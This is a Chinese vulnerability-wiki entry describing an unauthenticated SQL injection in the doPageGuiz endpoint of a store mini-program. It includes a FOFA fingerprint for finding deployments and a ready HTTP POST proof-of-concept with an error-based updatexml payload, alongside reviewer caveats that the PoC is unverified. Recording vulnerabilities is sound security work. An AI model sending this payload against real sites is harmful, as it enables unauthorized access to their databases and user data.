---
source: "SourByte05/Vulnerability-Wiki-PoC"
title: "万能门店小程序独立版 doPageGuiz uniacid SQL注入"
product: "万能门店小程序独立版"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "V5.2.0全开源独立版；MySQL XPath错误函数"
prerequisites: "匿名声称"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://github.com/SourByte05/Vulnerability-Wiki-PoC"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E4%B8%87%E8%83%BD%E9%97%A8%E5%BA%97%E5%B0%8F%E7%A8%8B%E5%BA%8F/%E4%B8%87%E8%83%BD%E9%97%A8%E5%BA%97%E5%B0%8F%E7%A8%8B%E5%BA%8F%20doPageGuiz%20sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md"
fofa: "body=\"/comhome/cases/index.html\""
id: "vw-042a423a5a318c511c2624d3"
entity_id: "ve-042a423a5a318c511c2624d3"
schema_version: "1"
previous_fofa_unverified: "body="
---

# 万能门店小程序独立版 doPageGuiz uniacid SQL注入

> 指纹字段校订（2026-10-04）：本文原归档明确标为 FOFA 的完整表达式已记入 `fofa`；原残缺 `fofa_unverified` 值逐字保存在 `previous_fofa_unverified`。后文关于该字段残缺的旧说明只描述校订前状态。查询用于产品检索，不证明资产受影响。

## 条目说明

- 对象与具体问题：万能门店小程序独立版；doPageGuiz uniacid SQL注入
- 版本、配置及部署条件：V5.2.0全开源独立版；MySQL XPath错误函数
- 认证与权限前提：匿名声称
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 只有md5(123)报错载荷，未给错误响应或源码，不能确认注入已成功
- SQLi到写命令需数据库权限/可写可执行目录等条件，不能并列当已证效果
- 在野已知与下载官方补丁均无链接；补发行方/版本和修复证据

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。

## 技术资料与来源记录

## 漏洞描述

万能门店小程序 在/doPageGuiz接口存在SQL注入漏洞，未经身份验证的恶意攻击者利用 SQL 注入漏洞获取数据库中的信息（例如管理员后台密码、站点用户个人信息）之外，攻击者甚至可以在高权限下向服务器写入命令，进一步获取服务器系统权限。

## 影响版本

万能门店小程序全开源独立版V5.2.0

## **漏洞状态**

| 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
|------|-------|-------|------|
| 原文提供部分细节 | 见技术资料 | 未独立核验 | 待来源核实 |

> 归档原表（原作者主张，未独立核验）：上表记录本库当前核验边界；下表保留归档中的公开情况和在野利用声明，不能据此认定本库已验证。
>
> | 漏洞细节 | 漏洞POC | 漏洞EXP | 在野利用 |
> |------|-------|-------|------|
> | 是 | 已公开 | 已公开 | 已知 |

### 风险等级

| 维度 | 评价 |
|----|----|
| 威胁等级 | 高危 |
| 影响面 | 广 |
| 攻击者价值 | 高 |
| 利用难度 | 低 |

## 漏洞复现

FOFA：body="/comhome/cases/index.html"

POC/EXP：

```http
POST /api/wxapps/doPageGuiz HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Host: 127.0.0.1

suid=1&uniacid=1 and updatexml(1,concat(0x7e,(select md5('123')),0x7e),1)--+
```


## 漏洞修复

参数使用预编译形式用以对sql注入防护，同时限制接口参数输入。

下载官方补丁进行修复


---

> 来源：SourByte05/Vulnerability-Wiki-PoC（https://github.com/SourByte05/Vulnerability-Wiki-PoC）
